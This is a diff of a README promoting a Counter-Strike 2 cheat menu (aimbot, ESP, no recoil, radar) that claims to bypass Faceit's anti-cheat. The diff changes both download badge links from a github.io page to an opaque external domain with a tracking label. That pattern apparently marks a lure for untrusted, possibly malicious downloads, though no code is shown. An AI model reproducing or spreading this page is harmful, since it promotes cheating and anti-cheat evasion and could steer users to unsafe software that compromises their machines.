@@ -2,7 +2,7 @@
 
 The **CS2 Cheat Menu with Faceit Bypass** is an advanced and stealth-oriented hack suite designed for *Counter-Strike 2* players who want a competitive edge without compromising detection on Faceit. Developed with cutting-edge anti-detection methods, this cheat menu delivers powerful features like legit aimbot, ESP, no recoil, and radar hacks while bypassing Faceit's kernel-level anti-cheat systems.
 
-[![Download CS2 CheatMenu](https://img.shields.io/badge/Download-CS2%20CheatMenu-blueviolet)](https://cs2-cheat-menu-faceit-bypass.github.io/.github/)
+[![Download CS2 CheatMenu](https://img.shields.io/badge/Download-CS2%20CheatMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 Whether you're grinding ELO, playing in semi-pro leagues, or testing for educational purposes, this tool ensures performance, precision, and protection all in one package.
 
@@ -56,4 +56,4 @@ Whether you're grinding ELO, playing in semi-pro leagues, or testing for educati
 3. Open the menu using the default key (`Insert`) and customize your config.
 4. Dominate in Faceit or use it responsibly for research/testing.
 
-[![Download CS2 CheatMenu](https://img.shields.io/badge/Download-CS2%20CheatMenu-blueviolet)](https://cs2-cheat-menu-faceit-bypass.github.io/.github/)
+[![Download CS2 CheatMenu](https://img.shields.io/badge/Download-CS2%20CheatMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
